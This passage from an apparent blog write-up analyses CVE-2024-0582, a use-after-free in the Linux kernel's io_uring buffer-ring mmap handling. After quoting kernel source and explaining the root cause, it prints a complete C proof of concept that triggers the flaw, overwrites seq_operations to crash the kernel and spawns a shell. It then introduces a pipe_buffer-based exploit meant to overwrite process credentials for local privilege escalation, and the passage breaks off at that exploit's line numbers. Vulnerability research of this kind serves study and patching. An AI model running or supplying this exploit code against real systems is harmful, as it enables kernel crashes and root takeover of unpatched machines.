pgoff, <span class="type">size_t</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span> =</span> file-&gt;private_data;</span><br><span class="line">    <span class="type">loff_t</span> offset = pgoff &lt;&lt; PAGE_SHIFT;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Don&#x27;t allow mmap if the ring was setup without it */</span></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP)</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (offset &amp; IORING_OFF_MMAP_MASK) &#123;</span><br><span class="line">    <span class="keyword">case</span> IORING_OFF_SQ_RING:</span><br><span class="line">    <span class="keyword">case</span> IORING_OFF_CQ_RING:</span><br><span class="line">        ptr = ctx-&gt;rings;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IORING_OFF_SQES:</span><br><span class="line">        ptr = ctx-&gt;sq_sqes;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IORING_OFF_PBUF_RING: &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> bgid;</span><br><span class="line"></span><br><span class="line">        bgid = (offset &amp; ~IORING_OFF_MMAP_MASK) &gt;&gt; IORING_OFF_PBUF_SHIFT;</span><br><span class="line">        mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">        ptr = io_pbuf_get_address(ctx, bgid);</span><br><span class="line">        mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">        <span class="keyword">if</span> (!ptr)</span><br><span class="line">            <span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page = virt_to_head_page(ptr);</span><br><span class="line">    <span class="keyword">if</span> (sz &gt; page_size(page))</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The logic of <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_pbuf_get_address">io_pbuf_get_address</a> is much simpler, which just take our <code>buf_ring</code> allocated before.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">io_pbuf_get_address</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">unsigned</span> <span class="type">long</span> bgid)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_buffer_list</span> *<span class="title">bl</span>;</span></span><br><span class="line"></span><br><span class="line">    bl = io_buffer_get_list(ctx, bgid);</span><br><span class="line">    <span class="keyword">if</span> (!bl || !bl-&gt;is_mmap)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bl-&gt;buf_ring;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>After the code analysis above, we can easily realize that the code of releasing a <code>PBUF_RING</code> lacks of a checker on the <code>mmap()</code>, which means that <strong>we can still access these freed pages by the memory-mapped region after releasing the ring buffer</strong> , leading to the <strong>use-after-free</strong> vulnerability.</p>
<p><img src="https://s2.loli.net/2025/03/14/3ovedsrfOby8KUw.png"></p>
<h2 id="Proof-Of-Concept"><a href="#Proof-Of-Concept" class="headerlink" title="Proof Of Concept"></a>Proof Of Concept</h2><p>Following code is a proof of concept written by me. This program just simply exploits the UAF vulnerability to overwrite the <code>seq_file::seq_operations</code> to cause the kernel panic. Note that you will need to compile it together with the <a target="_blank" rel="noopener" href="https://github.com/axboe/liburing">liburing</a> library.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;liburing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> IS_ERR</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_ERR(ptr) ((uintptr_t) ptr &gt;= (uintptr_t) -4095UL)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PTR_ERR</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR_ERR(ptr) ((int) (intptr_t) ptr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESSS_MSG(msg) <span class="string">&quot;\033[32m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg) <span class="string">&quot;\033[34m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERR_MSG(msg) <span class="string">&quot;\033[31m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(INFO_MSG(<span class="string">&quot;[*] Process binded to core: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> io_uring_buf_ring*</span><br><span class="line"><span class="title function_">setup_pbuf_ring_mmap</span><span class="params">(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> <span class="type">int</span> ring_entries,</span></span><br><span class="line"><span class="params">                     <span class="type">int</span> bgid, <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">int</span> *retp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_ring</span> *<span class="title">buf_ring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_reg</span> <span class="title">buf_reg</span>;</span></span><br><span class="line">    <span class="type">size_t</span> ring_size;</span><br><span class="line">    <span class="type">off_t</span> offset;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;buf_reg, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf_reg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we don&#x27;t need to set reg.addr for IOU_PBUF_RING_MMAP */</span></span><br><span class="line">    buf_reg.ring_entries = ring_entries;</span><br><span class="line">    buf_reg.bgid = bgid;</span><br><span class="line">    buf_reg.flags = IOU_PBUF_RING_MMAP;</span><br><span class="line"></span><br><span class="line">    ret = io_uring_register_buf_ring(ring, &amp;buf_reg, flags);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(ERR_MSG(<span class="string">&quot;[x] Error occur while doing io_uring_register_buf_ring&quot;</span>));</span><br><span class="line">        *retp = ret;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> [chr(int(i,16))for i in[&#x27;3361626e74747261&#x27;[i:i+2]for i in range(0,16,2)]][::-1]</span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line">    offset = IORING_OFF_PBUF_RING | (<span class="type">uint64_t</span>) bgid &lt;&lt; IORING_OFF_PBUF_SHIFT;</span><br><span class="line">    ring_size = ring_entries * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_buf);</span><br><span class="line">    buf_ring = mmap(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        ring_size,</span><br><span class="line">        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,</span><br><span class="line">        ring-&gt;ring_fd,</span><br><span class="line">        offset</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(buf_ring)) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(ERR_MSG(<span class="string">&quot;[x] Error occur while doing mmap() for io_uring&quot;</span>));</span><br><span class="line">        *retp = PTR_ERR(buf_ring);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *retp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> buf_ring;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_PAGES    1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_BUFFERS  0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEQ_FILE_NR 0x200</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">proof_of_concept</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>;</span></span><br><span class="line">    <span class="type">void</span> **buffers;</span><br><span class="line">    <span class="type">int</span> seq_fd[SEQ_FILE_NR], found = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(SUCCESSS_MSG(<span class="string">&quot;-------- CVE-2024-0582 Proof-of-concet --------&quot;</span>));</span><br><span class="line">    <span class="built_in">puts</span>(INFO_MSG(<span class="string">&quot;-------\t\t Author: &quot;</span>) <span class="string">&quot;arttnba3&quot;</span> INFO_MSG(<span class="string">&quot; \t-------&quot;</span>));</span><br><span class="line">    <span class="built_in">puts</span>(SUCCESSS_MSG(<span class="string">&quot;-----------------------------------------------\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Preparing...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (io_uring_queue_init(<span class="number">4</span>, &amp;ring, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(ERR_MSG(<span class="string">&quot;[x] Unable to init for io_uring queue&quot;</span>));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Allocating pbuf ring and doing mmap()...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buffers = <span class="built_in">calloc</span>(NR_BUFFERS, <span class="keyword">sizeof</span>(<span class="type">void</span>*));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NR_BUFFERS; i++) &#123;</span><br><span class="line">        buffers[i] = setup_pbuf_ring_mmap(</span><br><span class="line">            &amp;ring,</span><br><span class="line">            NR_PAGES * PAGE_SIZE / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_buf),</span><br><span class="line">            i,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            &amp;ret</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERR_MSG(<span class="string">&quot;[x] Unable to set up&quot;</span>) <span class="string">&quot; No.%d &quot;</span></span><br><span class="line">                ERR_MSG(<span class="string">&quot;pbuf ring, error code: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                i,</span><br><span class="line">                ret</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        io_uring_buf_ring_init(buffers[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Triggering page-level UAF vulnerabilities...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NR_BUFFERS; i++) &#123;</span><br><span class="line">        ret = io_uring_unregister_buf_ring(&amp;ring, i);</span><br><span class="line">        <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERR_MSG(<span class="string">&quot;[x] Unable to unregister&quot;</span>) <span class="string">&quot; No.%d &quot;</span></span><br><span class="line">                ERR_MSG(<span class="string">&quot;pbuf ring, error code: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                i,</span><br><span class="line">                ret</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Reallocating page into seq_file::seq_operations...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SEQ_FILE_NR; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                ERR_MSG(<span class="string">&quot;[x] Unable to open&quot;</span>) <span class="string">&quot; No.%d &quot;</span></span><br><span class="line">                ERR_MSG(<span class="string">&quot;seq file, error code: &quot;</span>) <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                i,</span><br><span class="line">                seq_fd[i]</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking data leak and overwriting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NR_BUFFERS; i++) &#123;</span><br><span class="line">        <span class="type">uint64_t</span> *buffer = buffers[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; (NR_PAGES * PAGE_SIZE / <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)); j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (buffer[j]&gt;<span class="number">0xffffffff80000000</span> &amp;&amp; buffer[j]&lt;<span class="number">0xfffffffff0000000</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(</span><br><span class="line">                    SUCCESSS_MSG(<span class="string">&quot;[+] Got kernel data leak:&quot;</span>) <span class="string">&quot; %lx &quot;</span></span><br><span class="line">                    SUCCESSS_MSG(<span class="string">&quot;at location &quot;</span>) <span class="string">&quot;%d-%d\n&quot;</span>,</span><br><span class="line">                    buffer[j],</span><br><span class="line">                    i,</span><br><span class="line">                    j</span><br><span class="line">                );</span><br><span class="line">                buffer[j] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">                found = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(ERR_MSG(<span class="string">&quot;[x] Failed to reallocate UAF page as seq_operations!&quot;</span>));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Triggering kernel panic...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SEQ_FILE_NR; i++) &#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">        read(seq_fd[i], buf, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[?] So you&#x27;re still alive here!?&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    proof_of_concept();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x02-Exploitation"><a href="#0x02-Exploitation" class="headerlink" title="0x02. Exploitation"></a>0x02. Exploitation</h1><p>As the vulnerability has provided us with the capability to read and write the use-after-free memory with almost no limits. It is very easy to be exploited with many of different techniques.</p>
<p>Following exploitation program is written by me, which reallocates the UAF page as <code>pipe_buffer</code> to grant attackers with the capability to do the arbitrary kernel memory read &amp; write by overwriting the <code>pipe_buffer::page</code>. This exploitation uses such capabilities to overwrite the <code>cred</code> of current process to complete a local privilege escalation.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span 